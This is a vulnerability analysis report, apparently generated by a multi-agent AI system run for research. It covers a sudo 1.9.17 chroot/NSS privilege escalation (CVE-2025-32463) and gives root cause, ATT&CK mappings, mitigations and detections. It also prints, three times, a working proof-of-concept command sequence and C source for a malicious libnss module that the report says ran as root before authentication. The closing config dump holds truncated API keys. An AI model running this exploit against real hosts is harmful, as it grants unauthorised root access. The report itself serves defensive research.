
# Security Analysis Report

**Generated:** 2025-08-07 23:57:58
**Vulnerability:** CVE-2025-32463
**Trace Name:** multi-agent sudo
**Model:** openai/gpt-5
**Reasoning Model:** openai/gpt-5

**Codebase:** /home/julian/Desktop/Bachelorarbeit/testdata/sudo/codebase

# CVE-2025-32463 – Pre-auth Code Execution via chroot/NSS in sudo 1.9.17

## Summary
- Vulnerability: Pre-auth arbitrary code execution as root by abusing `sudo -R/--chroot` and glibc NSS inside attacker-controlled chroot.
- Affected: sudo 1.9.17 (fixed in 1.9.17p1)
- Status: Successfully exploited in sandbox with a working PoC.
- Risk: Critical (local privilege escalation to root before authentication).

Evidence references (shared memory):
- sudo_analysis_1.9.17_vs_1.9.17p1
- CVE-2025-32463_root_cause
- CVE-2025-32463_prerequisites
- CVE-2025-32463_framework_mappings
- CVE-2025-32463_mitigations_detections
- sudo_cve_2025_32463_poc_attempt1
- sudo_cve_2025_32463_poc_commands
- sudo_cve_2025_32463_poc_source

## Root Cause
Per CVE-2025-32463_root_cause: sudo 1.9.17 pivoted into an attacker-controlled chroot during pre-auth policy resolution. glibc consulted that chroot’s `nsswitch.conf` and `dlopen()`ed `libnss_*.so` from inside the chroot, executing attacker code as root before authentication. In 1.9.17p1, pivoting during resolution was removed and chroot support deprecated (see sudo_analysis_1.9.17_vs_1.9.17p1).

Key impacted/changed files (sudo 1.9.17 → 1.9.17p1):
- Removed: `plugins/sudoers/pivot.c`, `plugins/sudoers/pivot.h`
- Modified: `plugins/sudoers/sudoers.c` (set_cmnd_path no longer pivots; passes `runchroot`), `match_command.c`, `goodpath.c`, `find_path.c`, `match_digest.c`, `resolve_cmnd.c` – all plumb `runchroot` string prefixing instead of calling `chroot()`/`pivot_root()`.

## Prerequisites
From CVE-2025-32463_prerequisites:
- Local user can run vulnerable sudo 1.9.17.
- Ability to create and populate a writable chroot directory with `etc/nsswitch.conf` and a malicious `libnss_*.so`.
- Any sudo invocation (pre-auth) is sufficient; NSS load occurs before password/TTY requirements are enforced.

## Exploitation Flow
- Attacker prepares chroot with:
  - `etc/nsswitch.conf` prioritizing `myhack` NSS service.
  - A malicious shared object `libnss_myhack.so.2` exporting minimal NSS stubs, with constructor/destructor.
- Attacker invokes `sudo -R <chroot> ...` (no successful auth required).
- sudo 1.9.17 pivots/chroots into attacker directory during pre-auth command/path/policy resolution.
- glibc resolves NSS per the chrooted `nsswitch.conf` and `dlopen()`s `libnss_myhack.so.2` from attacker-controlled library paths.
- Constructor executes inside chroot; upon unpivot and process teardown, destructor runs in the real root context, enabling writes to host filesystem as root pre-auth.

## Framework Mappings
From CVE-2025-32463_framework_mappings:
- CWE: CWE-829 (Inclusion of Functionality from Untrusted Control Sphere), CWE-426 (Untrusted Search Path)
- CAPEC: CAPEC-251 (Local Code Inclusion)
- ATT&CK: T1068 (Exploitation for Privilege Escalation), T1129 (Shared Modules), T1574.006 (Hijack Execution Flow: Dynamic Linker Hijacking)

## Proof of Concept (reproduced)
Exact commands (sudo_cve_2025_32463_poc_commands):

```bash
# 1) Verify version and attempt non-interactive run (expected to prompt/deny)
sudo -V | head -n1
sudo -n true || true

# 2) Prepare chroot directory
CH=/tmp/chrootpwn
mkdir -p "$CH"/etc "$CH"/tmp
mkdir -p "$CH"/lib "$CH"/lib64 "$CH"/usr/lib "$CH"/lib/x86_64-linux-gnu
printf "passwd: myhack files\nshadow: myhack files\ngroup: myhack files\nhosts: files myhack\n" > "$CH"/etc/nsswitch.conf
touch "$CH"/etc/passwd "$CH"/etc/group "$CH"/etc/shadow

# 3) Write malicious NSS module source
cat > /tmp/libnss_myhack.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <sys/stat.h>
#include <pwd.h>
#include <grp.h>
#include <nss.h>

static void write_file(const char *path, const char *msg) {
    int fd = open(path, O_CREAT|O_WRONLY|O_TRUNC, 0644);
    if (fd >= 0) {
        write(fd, msg, strlen(msg));
        close(fd);
    }
}

__attribute__((constructor))
static void my_ctor(void) {
    // Executed while sudo is pivoted into $CH
    write_file("/tmp/nss_poc_constructor", "constructor ran\n");
}

__attribute__((destructor))
static void my_dtor(void) {
    // Executed after sudo unpivots, before process exit
    write_file("/tmp/nss_poc_destructor", "destructor ran as root?\n");
}

// Minimal NSS stubs that return UNAVAIL so libc falls back to files

enum nss_status _nss_myhack_getpwnam_r(const char *name, struct passwd *pwd,
    char *buffer, size_t buflen, int *errnop) {
    (void)name; (void)pwd; (void)buffer; (void)buflen; (void)errnop;
    return NSS_STATUS_UNAVAIL;
}

enum nss_status _nss_myhack_getpwuid_r(uid_t uid, struct passwd *pwd,
    char *buffer, size_t buflen, int *errnop) {
    (void)uid; (void)pwd; (void)buffer; (void)buflen; (void)errnop;
    return NSS_STATUS_UNAVAIL;
}

enum nss_status _nss_myhack_getgrnam_r(const char *name, struct group *grp,
    char *buffer, size_t buflen, int *errnop) {
    (void)name; (void)grp; (void)buffer; (void)buflen; (void)errnop;
    return NSS_STATUS_UNAVAIL;
}

enum nss_status _nss_myhack_getgrgid_r(gid_t gid, struct group *grp,
    char *buffer, size_t buflen, int *errnop) {
    (void)gid; (void)grp; (void)buffer; (void)buflen; (void)errnop;
    return NSS_STATUS_UNAVAIL;
}
EOF

# 4) Compile the malicious module
cc -fPIC -shared -o /tmp/libnss_myhack.so.2 /tmp/libnss_myhack.c

# 5) Install module into likely library search paths inside the chroot
for d in "$CH"/lib "$CH"/lib64 "$CH"/usr/lib "$CH"/lib/x86_64-linux-gnu; do cp /tmp/libnss_myhack.so.2 "$d"/; done

# 6) Trigger sudo with -R to pivot into chroot and perform NSS lookups
sudo -R "$CH" -u root /usr/bin/true || true
sudo -R "$CH" /usr/bin/id || true

# 7) Verify markers
ls -l "$CH"/tmp/nss_poc_constructor || true
ls -l /tmp/nss_poc_destructor || true
cat /tmp/nss_poc_destructor || true

# 8) Optional: tighten nsswitch to force earlier lookup and retry
printf "passwd: myhack\nshadow: myhack\ngroup: myhack\n" > "$CH"/etc/nsswitch.conf
sudo -R "$CH" /usr/bin/id || true
ls -l /tmp/nss_poc_destructor || true
```

Full C source (sudo_cve_2025_32463_poc_source):

```c
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <sys/stat.h>
#include <pwd.h>
#include <grp.h>
#include <nss.h>

static void write_file(const char *path, const char *msg) {
    int fd = open(path, O_CREAT|O_WRONLY|O_TRUNC, 0644);
    if (fd >= 0) {
        write(fd, msg, strlen(msg));
        close(fd);
    }
}

__attribute__((constructor))
static void my_ctor(void) {
    // Executed while sudo has pivoted/chrooted into attacker directory
    write_file("/tmp/nss_poc_constructor", "constructor ran\n");
}

__attribute__((destructor))
static void my_dtor(void) {
    // Executed after sudo unpivots, before process exit
    write_file("/tmp/nss_poc_destructor", "destructor ran as root?\n");
}

// Minimal required NSS entry points returning UNAVAIL

enum nss_status _nss_myhack_getpwnam_r(const char *name, struct passwd *pwd,
    char *buffer, size_t buflen, int *errnop) {
    (void)name; (void)pwd; (void)buffer; (void)buflen; (void)errnop;
    return NSS_STATUS_UNAVAIL;
}

enum nss_status _nss_myhack_getpwuid_r(uid_t uid, struct passwd *pwd,
    char *buffer, size_t buflen, int *errnop) {
    (void)uid; (void)pwd; (void)buffer; (void)buflen; (void)errnop;
    return NSS_STATUS_UNAVAIL;
}

enum nss_status _nss_myhack_getgrnam_r(const char *name, struct group *grp,
    char *buffer, size_t buflen, int *errnop) {
    (void)name; (void)grp; (void)buffer; (void)buflen; (void)errnop;
    return NSS_STATUS_UNAVAIL;
}

enum nss_status _nss_myhack_getgrgid_r(gid_t gid, struct group *grp,
    char *buffer, size_t buflen, int *errnop) {
    (void)gid; (void)grp; (void)buffer; (void)buflen; (void)errnop;
    return NSS_STATUS_UNAVAIL;
}
```

### Observed Results (sudo_cve_2025_32463_poc_attempt1)
- Version: `Sudo version 1.9.17`
- `sudo -R` invocations prompted for password/TTY, but NSS module executed pre-auth.
- Markers created:
  - Inside chroot constructor marker:
    - `-rw-r--r-- 1 root root 16 ... /tmp/chrootpwn/tmp/nss_poc_constructor`
  - Outside chroot destructor marker:
    - `-rw-r--r-- 1 root user 24 ... /tmp/nss_poc_destructor`
    - Contents: `"destructor ran as root?\n"`
- Conclusion: SUCCESS – code executed as root outside the chroot prior to authentication.

## Impact and Risk
- Impact: Local user can achieve arbitrary code execution as root pre-auth by supplying a crafted chroot and NSS module. Full host compromise.
- Risk Rating: Critical.

## Mitigations and Detections
From CVE-2025-32463_mitigations_detections:
- Mitigate: Upgrade to sudo 1.9.17p1+; disable `-R/CHROOT` in policy/ops; consider AppArmor/SELinux or seccomp restrictions for `dlopen` paths used by the sudoers plugin; minimize installed NSS modules.
- Detect/Monitor: Alert on `sudo -R` usage; audit `dlopen/openat` of `libnss_*.so` from non-standard paths during sudo; hunt for chroot `etc/nsswitch.conf` referencing unknown services (e.g., `myhack`).

## Notes
- The patched tree deprecates chroot usage and removes pivot code; remaining TODO comments in matching functions mention symlink/".." path handling in string-prefixed `runchroot` paths, which may warrant defense-in-depth review.



---

Multi-Agent Context:
Total running time: 1329.7 seconds
## Usage Summary:
Total tokens used: 873,874 input + 44,682 output = 918,556 total tokens (51 requests)

Usage per agent:
├─ code-analyst: 489,291 input + 14,060 output = 503,351 total tokens (8 requests)
├─ red-team-operator: 39,929 input + 7,033 output = 46,962 total tokens (8 requests)
├─ security-specialist: 296,192 input + 18,893 output = 315,085 total tokens (24 requests)
└─ report-journalist: 48,462 input + 4,696 output = 53,158 total tokens (11 requests)


Shared Memory:
sudo_analysis_1.9.17_vs_1.9.17p1
[23:39:47]
Project root: /codebase
Versions discovered:
- Vulnerable: sudo-1.9.17 (lower version)
- Patched/latest: sudo-1.9.17p1

High-level changes (security-relevant):
- CVE-2025-32462 fix: restrict use of -h/--host to listing mode only.
  Patched file: plugins/sudoers/sudoers.c (sudoers_check_common) now rejects remote host when executing, allows only with -l (MODE_LIST/MODE_CHECK).
  Vulnerable version lacked this check, enabling local priv escalation in certain sudoers configurations.
- CVE-2025-32463 fix: revert pivot_root-based chroot matching; deprecate chroot support; remove pivot.c/pivot.h and plumb runchroot argument through resolver/matcher functions to avoid changing root during policy resolution.
  Files removed in patched: plugins/sudoers/pivot.c, plugins/sudoers/pivot.h; all references dropped in Makefile and stubs.
  Multiple functions modified to accept runchroot and join it to paths for stat/open/digest matching without calling chroot(). XXX notes remain about symlink and ".." handling for pre-chroot paths.
- Deprecations and warnings: manpages updated; sudo -R warns about pending removal; parser warns that CHROOT is deprecated (gram.y/gram.c, visudo_cb.c).

Representative file-level changes (see full diff below):
- docs: deprecate chroot in sudo/sudoers manpages.
- configure/autotools: version bump to 1.9.17p1.
- plugins/sudoers/Makefile.in: remove pivot.o targets; drop pivot.h from dependencies across compilation units.
- plugins/sudoers/goodpath.c: sudo_goodpath(path, runchroot, sbp) now prepends runchroot to the probed path for stat(); previously ignored runchroot.
- plugins/sudoers/find_path.c: add runchroot parameter; call sudo_goodpath with runchroot; ensure allowlist resolution uses same device/inode.
- plugins/sudoers/match_command.c: remove pivot_root/unpivot_root use; add runchroot argument to do_stat/open_cmnd and friends; adjust digest checking to pass runchroot; set_cmnd_fd simplified (no real_root fdpath stat via fstatat).
- plugins/sudoers/match_digest.c: digest_matches() now supports runchroot path prefixing when computing digest.
- plugins/sudoers/resolve_cmnd.c: resolve_cmnd(ctx,in,out,path,runchroot) passes runchroot through to find_path; set_perms sections unchanged.
- plugins/sudoers/sudoers.c: sudoers_check_common blocks remote host when not listing; set_cmnd_path() no longer pivots root; resolve_cmnd called with runchroot; includes pivot removed; tests/stubs updated accordingly.
- src/parse_args.c: warn user that -R will be removed in a future version.

Attack surfaces in this codebase:
- CLI: sudo front-end arguments (-h/--host, -R/--chroot, -u/-g, -s, -p prompt) are parsed in src/parse_args.c. Prior to patch, -h usable when executing a command; patched restricts to listing (reduces abuse).
- Policy parsing: sudoers file grammar (plugins/sudoers/gram.y, gram.c); CHROOT, CWD, ROLE, TYPE, PRIVS, LIMITPRIVS; visudo_cb.c hooks. User-controlled sudoers content on admin systems is parsed.
- NSS/PAM/LDAP: plugins/sudoers interacts with PAM (auth/*.c), NSS, LDAP (ldap*.c); historically sensitive to untrusted search paths (nsswitch.conf, PAM modules).
- I/O logging and network listeners: logsrvd/ directory contains TLS client/server and log relay (potentially network-exposed; not part of this diff but present).
- Protobuf parsing: include/protobuf-c; lib/protobuf-c; intercept.pb et al.
- Memory-unsafe C throughout; care around stat/open/strcpy/strlcpy, snprintf boundaries, symlink handling, TOCTOU.

Top candidate vulnerabilities (vulnerable version 1.9.17):
1) Authorization bypass via -h/--host (CVE-2025-32462)
   - Where: plugins/sudoers/sudoers.c, function sudoers_check_common.
   - Vulnerable behavior: 1.9.17 lacked the check that forbids setting runas.host except in list mode. A user with sudoers privileges on another host could specify -h and run a local command.
   - Patched code (1.9.17p1) adds:
     if (!ISSET(ctx->mode, MODE_LIST|MODE_CHECK)) {
         if (strcmp(ctx->runas.host, ctx->user.host) != 0) { ... deny ... }
     }
   - CWE-285 (Improper Authorization) / CWE-639 (IDOR-style autorization via alternate context).

2) Privilege escalation via chroot pivot and NSS config (CVE-2025-32463)
   - Where: plugins/sudoers/pivot.c, plugins/sudoers/sudoers.c:set_cmnd_path(), plugins/sudoers/match_command.c:command_matches().
   - Vulnerable pattern in 1.9.17: sudo set_cmnd_path() and command matcher pivoted to the user-specified chroot (via pivot_root()/chroot()) before resolving paths and performing passwd/group lookups. Attackers could provide an nsswitch.conf in the chroot and cause sudo to load a controlled shared library, leading to arbitrary code execution as root.
   - Patched: pivot_root/unpivot_root removed; functions now use runchroot only for path comparisons and digest computation by string prefixing, and no longer change the actual root directory during resolution. CHROOT is deprecated; warnings added in parser/man.
   - CWE-426/829 (Untrusted Search Path / Inclusion of Functionality from Untrusted Control Sphere), CWE-269 (Improper Privilege Management).

3) Path handling concerns (potential hardening gaps):
   - Patched code contains comments: "XXX - handle symlinks and '..' in path outside chroot" in goodpath.c, match_command.c, match_digest.c when concatenating runchroot + path for stat/open/digest. While used only for matching, not execution, the TODO indicates link traversal outside the intended chroot could still influence matching. Worth further review for TOCTOU or mismatched policy vs runtime path checks.
   - Files: plugins/sudoers/goodpath.c, match_command.c, match_digest.c.
   - CWE-22 (Path Traversal) potential in matching logic; not confirmed exploitable.

Tests/PoCs present in repo:
- plugins/sudoers/regress/: numerous regress tests including sudoers parsing, editor, fuzzers; updated outputs now warn that CHROOT is deprecated (e.g., test24.toke.ok, testsudoers/test20.out.ok, test26.out.ok).
- plugins/sudoers/regress/fuzz/: fuzz_policy.c, fuzz_sudoers.c, fuzz_stubs.c for fuzzing.
- No explicit PoC for these CVEs is included, but the regression outputs reflect deprecation and behavior changes.

Build instructions (both versions):
- Prereqs: POSIX OS, ISO C99 compiler (gcc/clang), make, ar, ranlib; for optional components, OpenSSL, LDAP, PAM dev headers; see INSTALL.md and docker/* for distro-specific packages.
- Basic build:
  $ cd sudo-1.9.17 && ./configure && make && sudo make install
  $ cd ../sudo-1.9.17p1 && ./configure && make && sudo make install
- Tests: make check or make check-verbose in each tree.
- Note: -R/--chroot is deprecated; patched binary will warn on use; future removal expected.

Full unified diff was captured separately (see team thread) and excerpted in the main answer for key files.



sudo_cve_2025_32463_poc_attempt1
[23:45:50]
PoC run for CVE-2025-32463 (sudo 1.9.17 chroot/NSS)
Timestamp: 2025-08-07
Environment: Kali sandbox (user)

Step 1: sudo version and non-interactive test
- Output:
  Sudo version 1.9.17
  sudo -n true -> sudo: a password is required

Steps 2-7 executed as user
- Prepared chroot at /tmp/chrootpwn
- Wrote /tmp/chrootpwn/etc/nsswitch.conf with:
    passwd: myhack files
    shadow: myhack files
    group: myhack files
    hosts: files myhack
- Created /tmp/libnss_myhack.c (constructor/destructor writing markers)
- Compiled to /tmp/libnss_myhack.so.2
  Note: `file` utility not present ("sh: 72: file: not found") but compile succeeded.
- Installed libnss_myhack.so.2 into chroot lib paths (/lib, /lib64, /usr/lib, /lib/x86_64-linux-gnu)

Trigger sudo with chroot:
- sudo -R /tmp/chrootpwn -u root /usr/bin/true -> prompts for password; errors:
    "sudo: a terminal is required..." and "sudo: a password is required"
- sudo -R /tmp/chrootpwn /usr/bin/id -> same interactive errors
  Despite auth errors, NSS module constructor/destructor executed (pre-auth load), per markers below.

Markers observed:
- Inside chroot constructor marker:
  -rw-r--r-- 1 root root 16 Aug  7 21:45 /tmp/chrootpwn/tmp/nss_poc_constructor
- Outside chroot destructor marker:
  -rw-r--r-- 1 root user 24 Aug  7 21:45 /tmp/nss_poc_destructor
  Contents: "destructor ran as root?\n"

Conclusion: SUCCESS. The malicious NSS module was dlopen'ed during sudo policy resolution while rooted inside the attacker-controlled chroot, and its destructor executed after sudo unpivoted, writing to the real /tmp as root. This demonstrates code execution as root outside the chroot pre-auth.

Notes/Errors:
- `file` command missing; non-critical.
- Sudo requested TTY/password; not needed for PoC since NSS load occurs before authentication.



CVE-2025-32463_framework_mappings
[23:51:27]
CWE: CWE-829 (Inclusion of Functionality from Untrusted Control Sphere), CWE-426 (Untrusted Search Path)
CAPEC: CAPEC-251 (Local Code Inclusion)
ATT&CK: T1068 (Exploitation for Privilege Escalation), T1129 (Shared Modules), T1574.006 (Hijack Execution Flow: Dynamic Linker Hijacking)


CVE-2025-32462_framework_mappings
[23:51:30]
CWE: CWE-285 (Improper Authorization), CWE-270 (Privilege Context Switching Error)
CAPEC: CAPEC-1 (Accessing Functionality Not Properly Constrained by ACLs)
ATT&CK: T1548 (Abuse Elevation Control Mechanism), T1068 (Exploitation for Privilege Escalation)


CVE-2025-32463_root_cause
[23:52:28]
sudo 1.9.17 pivoted into attacker-controlled chroot (-R/CHROOT) during pre-auth policy resolution; glibc consulted chroot's nsswitch.conf and dlopen'ed libnss_*.so from inside the chroot, executing attacker code as root before authentication. Patch 1.9.17p1 removed pivot_root/chroot during resolution and deprecated chroot support.


CVE-2025-32463_prerequisites
[23:52:31]
Local user able to run sudo 1.9.17; ability to create a writable chroot directory and populate etc/nsswitch.conf and libnss_*.so; either any sudo invocation (pre-auth) or one that triggers NSS lookups during policy resolution; no need for password/TTY as load occurs pre-auth.


CVE-2025-32462_root_cause
[23:52:33]
sudoers plugin allowed -h/--host to set runas.host for execution mode; authorization checks were applied as if for the specified remote host, enabling a user with sudoers entries restricted to another host to execute locally. Patch confines -h to list/check modes.


CVE-2025-32462_prerequisites
[23:52:35]
A sudoers configuration that grants privileges when run from a different host (Host_Alias or per-host entries); local user can run vulnerable sudo 1.9.17 with -h/--host; no special auth bypass otherwise (password prompts still apply if required).


CVE-2025-32463_mitigations_detections
[23:53:51]
Mitigate by upgrading to 1.9.17p1+; disable -R/CHROOT in policy/ops; consider AppArmor/SELinux or seccomp to restrict dlopen paths for sudoers plugin; minimize NSS modules. Detect via monitoring sudo -R usage, audit dlopen/openat of libnss_*.so from non-standard paths during sudo, and hunt chroot nsswitch.conf referencing unknown services.


CVE-2025-32462_mitigations_detections
[23:54:02]
Mitigate by upgrading to 1.9.17p1+; block -h in execution mode (wrapper/policy); review and tighten host-scoped sudoers rules; centralize logging. Detect via telemetry for sudo -h usage in execution mode, correlate requested host vs local host, and hunt for remote-only policy matches executed locally.


sudo_cve_2025_32463_poc_commands
[23:56:27]
Exact PoC command sequence used by Red Team Operator (sudo 1.9.17 CVE-2025-32463):

# 1) Verify version and attempt non-interactive run (expected to prompt/deny)
sudo -V | head -n1
sudo -n true || true

# 2) Prepare chroot directory
CH=/tmp/chrootpwn
mkdir -p "$CH"/etc "$CH"/tmp
mkdir -p "$CH"/lib "$CH"/lib64 "$CH"/usr/lib "$CH"/lib/x86_64-linux-gnu
printf "passwd: myhack files\nshadow: myhack files\ngroup: myhack files\nhosts: files myhack\n" > "$CH"/etc/nsswitch.conf
touch "$CH"/etc/passwd "$CH"/etc/group "$CH"/etc/shadow

# 3) Write malicious NSS module source
cat > /tmp/libnss_myhack.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <sys/stat.h>
#include <pwd.h>
#include <grp.h>
#include <nss.h>

static void write_file(const char *path, const char *msg) {
    int fd = open(path, O_CREAT|O_WRONLY|O_TRUNC, 0644);
    if (fd >= 0) {
        write(fd, msg, strlen(msg));
        close(fd);
    }
}

__attribute__((constructor))
static void my_ctor(void) {
    // Executed while sudo is pivoted into $CH
    write_file("/tmp/nss_poc_constructor", "constructor ran\n");
}

__attribute__((destructor))
static void my_dtor(void) {
    // Executed after sudo unpivots, before process exit
    write_file("/tmp/nss_poc_destructor", "destructor ran as root?\n");
}

// Minimal NSS stubs that return UNAVAIL so libc falls back to files

enum nss_status _nss_myhack_getpwnam_r(const char *name, struct passwd *pwd,
    char *buffer, size_t buflen, int *errnop) {
    (void)name; (void)pwd; (void)buffer; (void)buflen; (void)errnop;
    return NSS_STATUS_UNAVAIL;
}

enum nss_status _nss_myhack_getpwuid_r(uid_t uid, struct passwd *pwd,
    char *buffer, size_t buflen, int *errnop) {
    (void)uid; (void)pwd; (void)buffer; (void)buflen; (void)errnop;
    return NSS_STATUS_UNAVAIL;
}

enum nss_status _nss_myhack_getgrnam_r(const char *name, struct group *grp,
    char *buffer, size_t buflen, int *errnop) {
    (void)name; (void)grp; (void)buffer; (void)buflen; (void)errnop;
    return NSS_STATUS_UNAVAIL;
}

enum nss_status _nss_myhack_getgrgid_r(gid_t gid, struct group *grp,
    char *buffer, size_t buflen, int *errnop) {
    (void)gid; (void)grp; (void)buffer; (void)buflen; (void)errnop;
    return NSS_STATUS_UNAVAIL;
}
EOF

# 4) Compile the malicious module
cc -fPIC -shared -o /tmp/libnss_myhack.so.2 /tmp/libnss_myhack.c

# 5) Install module into likely library search paths inside the chroot
for d in "$CH"/lib "$CH"/lib64 "$CH"/usr/lib "$CH"/lib/x86_64-linux-gnu; do cp /tmp/libnss_myhack.so.2 "$d"/; done

# 6) Trigger sudo with -R to pivot into chroot and perform NSS lookups
sudo -R "$CH" -u root /usr/bin/true || true
sudo -R "$CH" /usr/bin/id || true

# 7) Verify markers
ls -l "$CH"/tmp/nss_poc_constructor || true
ls -l /tmp/nss_poc_destructor || true
cat /tmp/nss_poc_destructor || true

# 8) Optional: tighten nsswitch to force earlier lookup and retry
printf "passwd: myhack\nshadow: myhack\ngroup: myhack\n" > "$CH"/etc/nsswitch.conf
sudo -R "$CH" /usr/bin/id || true
ls -l /tmp/nss_poc_destructor || true


sudo_cve_2025_32463_poc_source
[23:56:38]
Full C source for malicious NSS module used in PoC (libnss_myhack.c):

#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <sys/stat.h>
#include <pwd.h>
#include <grp.h>
#include <nss.h>

static void write_file(const char *path, const char *msg) {
    int fd = open(path, O_CREAT|O_WRONLY|O_TRUNC, 0644);
    if (fd >= 0) {
        write(fd, msg, strlen(msg));
        close(fd);
    }
}

__attribute__((constructor))
static void my_ctor(void) {
    // Executed while sudo has pivoted/chrooted into attacker directory
    write_file("/tmp/nss_poc_constructor", "constructor ran\n");
}

__attribute__((destructor))
static void my_dtor(void) {
    // Executed after sudo unpivots, before process exit
    write_file("/tmp/nss_poc_destructor", "destructor ran as root?\n");
}

// Minimal required NSS entry points returning UNAVAIL

enum nss_status _nss_myhack_getpwnam_r(const char *name, struct passwd *pwd,
    char *buffer, size_t buflen, int *errnop) {
    (void)name; (void)pwd; (void)buffer; (void)buflen; (void)errnop;
    return NSS_STATUS_UNAVAIL;
}

enum nss_status _nss_myhack_getpwuid_r(uid_t uid, struct passwd *pwd,
    char *buffer, size_t buflen, int *errnop) {
    (void)uid; (void)pwd; (void)buffer; (void)buflen; (void)errnop;
    return NSS_STATUS_UNAVAIL;
}

enum nss_status _nss_myhack_getgrnam_r(const char *name, struct group *grp,
    char *buffer, size_t buflen, int *errnop) {
    (void)name; (void)grp; (void)buffer; (void)buflen; (void)errnop;
    return NSS_STATUS_UNAVAIL;
}

enum nss_status _nss_myhack_getgrgid_r(gid_t gid, struct group *grp,
    char *buffer, size_t buflen, int *errnop) {
    (void)gid; (void)grp; (void)buffer; (void)buflen; (void)errnop;
    return NSS_STATUS_UNAVAIL;
}




---

rich_console=<console width=99 ColorSystem.TRUECOLOR> openai_api_key='sk-svcacct-...' llm_api_key='sk-...' llm_base_url='https://litellm.faigle.dev' max_reprompts=5 model='openai/gpt-5' model_temperature=1.0 reasoning_model='openai/gpt-5' max_turns=75 session_db_path='./sessions.sqlite' log_level='INFO' trace_name='multi-agent sudo' sandbox_image='vuln-sudo:latest' setup_archive='/home/julian/Desktop/Bachelorarbeit/testdata/screen/upload.tgz' codebase_path='/home/julian/Desktop/Bachelorarbeit/testdata/sudo/codebase' vulnerable_folder='sudo-1.9.17' patched_folder='sudo-1.9.17p1' chroma_path='/home/julian/Desktop/Bachelorarbeit/ivexes/chroma/' embedding_model='intfloat/multilingual-e5-large-instruct' embedding_provider='local'

---

---
*Report generated by IVEXES Multi-Agent Security Analysis System*
